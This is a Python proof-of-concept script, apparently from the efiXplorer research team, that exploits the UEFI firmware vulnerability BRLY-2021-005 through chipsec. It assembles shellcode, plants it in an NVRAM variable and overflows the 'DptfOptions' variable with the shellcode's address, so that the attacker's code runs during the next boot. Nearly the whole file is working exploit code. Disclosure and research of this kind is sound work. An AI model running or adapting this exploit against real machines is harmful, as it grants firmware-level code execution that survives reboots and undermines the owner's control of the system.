import os
import struct
import tempfile

import chipsec.chipset
from chipsec.hal.uefi import UEFI

cs = chipsec.chipset.cs()
cs.init(None, True, True)

uefi = UEFI(cs)
system_table_pa = uefi.find_EFI_System_Table()[1]
runtime_services_pa = uefi.find_EFI_RuntimeServices_Table()[1]

print(f"SystemTable: {system_table_pa:#x}")
print(f"RuntimeServices: {runtime_services_pa:#x}")

code = f"""
use64

_Restore:
    ; Clear DptfOptions variable
    ; gRT->SetVariable((CHAR16 *)L"DptfOptions", &VendorGuid, 7, 0, 0)
    mov rax, {runtime_services_pa:#x}
    call variable_name_addr
    variable_name_addr:
    pop rcx
    add rcx, variable_name
    sub rcx, variable_name_addr
    call variable_guid_addr
    variable_guid_addr:
    pop rdx
    add rdx, variable_guid
    sub rdx, variable_guid_addr
    mov r8d, 0x7 ; Attributes
    xor r9, r9 ; DataSize
    push r9 ; Data
    call qword [rax+58h]
    add rsp, 8

_PrintMsg:
    ; gST->ConOut->SetAttribute)(gST->ConOut, EFI_GREEN);
    mov rax, {system_table_pa:#x}
    mov rdx, 0x02
    mov r8, [rax+40h]
    mov rcx, r8
    call qword [r8+28h]

    ; gST->ConOut->OutputString)(gST->ConOut, message);
    mov rax, {system_table_pa:#x}
    call message_addr
    message_addr:
    pop rdx
    add rdx, message
    sub rdx, message_addr
    mov r8, [rax+40h]
    mov rcx, r8
    call qword [r8+8]

_InfLoop:
    jmp short $-2

variable_name: ; "DptfOptions"
    db 0x44, 0x00, 0x70, 0x00, 0x74, 0x00, 0x66, 0x00
    db 0x4F, 0x00, 0x70, 0x00, 0x74, 0x00, 0x69, 0x00
    db 0x6F, 0x00, 0x6E, 0x00, 0x73, 0x00, 0x00, 0x00

variable_guid:
    db 0xCE, 0x9E, 0x3B, 0xFB, 0xBA, 0x4A, 0x33, 0x49
    db 0xB4, 0x9D, 0xB4, 0xD6, 0x7D, 0x89, 0x23, 0x51

; GREETINGS from efiXplorer TEAM!
; BRLY-2021-005 got EXPLOITED successfully \o/
message:
    db 0x47, 0x00, 0x52, 0x00, 0x45, 0x00, 0x45, 0x00
    db 0x54, 0x00, 0x49, 0x00, 0x4e, 0x00, 0x47, 0x00
    db 0x53, 0x00, 0x20, 0x00, 0x66, 0x00, 0x72, 0x00
    db 0x6f, 0x00, 0x6d, 0x00, 0x20, 0x00, 0x65, 0x00
    db 0x66, 0x00, 0x69, 0x00, 0x58, 0x00, 0x70, 0x00
    db 0x6c, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x65, 0x00
    db 0x72, 0x00, 0x20, 0x00, 0x54, 0x00, 0x45, 0x00
    db 0x41, 0x00, 0x4d, 0x00, 0x21, 0x00, 0x0d, 0x00
    db 0x0a, 0x00, 0x42, 0x00, 0x52, 0x00, 0x4c, 0x00
    db 0x59, 0x00, 0x2d, 0x00, 0x32, 0x00, 0x30, 0x00
    db 0x32, 0x00, 0x31, 0x00, 0x2d, 0x00, 0x30, 0x00
    db 0x30, 0x00, 0x35, 0x00, 0x20, 0x00, 0x67, 0x00
    db 0x6f, 0x00, 0x74, 0x00, 0x20, 0x00, 0x45, 0x00
    db 0x58, 0x00, 0x50, 0x00, 0x4c, 0x00, 0x4f, 0x00
    db 0x49, 0x00, 0x54, 0x00, 0x45, 0x00, 0x44, 0x00
    db 0x20, 0x00, 0x73, 0x00, 0x75, 0x00, 0x63, 0x00
    db 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00
    db 0x66, 0x00, 0x75, 0x00, 0x6c, 0x00, 0x6c, 0x00
    db 0x79, 0x00, 0x20, 0x00, 0x5c, 0x00, 0x6f, 0x00
    db 0x2f, 0x00, 0x00, 0x00
"""

# compile shellcode
shellcode = bytes()
with tempfile.NamedTemporaryFile(
    mode="w", prefix="code_", suffix=".asm", dir=None, delete=True
) as asm:
    asm.write(code)
    asm.flush()
    result = os.system(" ".join(["nasm", asm.name]))
    fname, _ = os.path.splitext(asm.name)
    with open(fname, "rb") as bin:
        shellcode = bin.read()


def set_dptf_options(data: bytes):
    uefi.set_EFI_variable(
        "DptfOptions",
        "fb3b9ece-4aba-4933-b49d-b4d67d892351",
        data,
        datasize=len(data),
        attrs=0x7,
    )


def delete_dptf_options():
    uefi.set_EFI_variable(
        "DptfOptions",
        "fb3b9ece-4aba-4933-b49d-b4d67d892351",
        b"",
        datasize=0,
        attrs=0x7,
    )


def set_shellcode(shellcode: bytes):
    uefi.set_EFI_variable(
        "Shellcode",
        "846af935-b36b-4a28-85f6-cbe49bd82145",
        shellcode,
        datasize=len(shellcode),
        attrs=0x7,
    )


def delete_shellcode():
    uefi.set_EFI_variable(
        "Shellcode",
        "846af935-b36b-4a28-85f6-cbe49bd82145",
        b"",
        datasize=0,
        attrs=0x7,
    )


def get_shellcode_address(shellcode: bytes) -> int:
    mmio_start = 0x00000000FF000000
    mmio_end = 0x00000000FFFFFFFF
    mem_read = cs.helper.read_physical_mem
    data = mem_read(mmio_start, mmio_end - mmio_start + 1)
    offset = data.find(shellcode)
    if offset == -1:
        return offset
    shellcode_address = mmio_start + offset
    return shellcode_address


delete_dptf_options()
delete_shellcode()

# write shellcode to NVRAM variable
set_shellcode(shellcode)

shellcode_address = get_shellcode_address(shellcode)
assert shellcode_address != -1
print(f"Shellcode located at {shellcode_address:#x}")

data = b"A" * (0x20 + 0x10) + struct.pack("<Q", shellcode_address)
set_dptf_options(data)

print(f"The code will be executed during the next boot")
